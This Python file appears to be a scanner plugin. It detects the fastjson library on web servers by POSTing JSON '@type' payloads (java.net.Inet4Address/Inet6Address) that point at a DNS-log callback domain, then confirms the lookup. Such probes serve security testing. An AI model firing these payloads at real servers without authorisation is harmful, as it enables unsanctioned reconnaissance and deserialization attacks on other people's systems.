# -*- coding: utf-8 -*-
# @Time    : 20-5-4 23:43
# @Author  : orleven

import asyncio
import uuid
import subprocess
from Crypto.Cipher import AES
from lib.core.data import logger
from lib.utils.cipher import base64encode
from lib.utils.cipher import base64decode
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'fastjson info'
        self.keyword = ['fastjson', 'info']
        self.info = 'fastjson 1267 info'
        self.type = VUL_TYPE.INFO
        self.level = VUL_LEVEL.INFO
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        await self.get_url()
        if self.base_url:
            dns = self.ceye_dns_api(k='fjinfo', t='dns')
            # logger.sysinfo(dns + ' ------- '+  self.base_url)
            async with ClientSession() as session:
                pocs = [
                    {"test": {"@type": "java.net.Inet4Address", "val": dns}},
                    {"test": {"@type": "java.net.Inet6Address", "val": dns}},
                ]
                for poc in pocs:
                    path_list = list(set([
                        self.url,
                        self.url_normpath(self.base_url, '/'),
                        self.url_normpath(self.url, './'),
                    ]))
                    for url in path_list:
                        try:
                            async with session.post(url=url, json=poc) as res:
                                pass
                        except:
                            pass
                if await self.ceye_verify_api(dns, 'dns'):
                    self.flag = 1
                    self.res.append({"info": url, "key": dns})






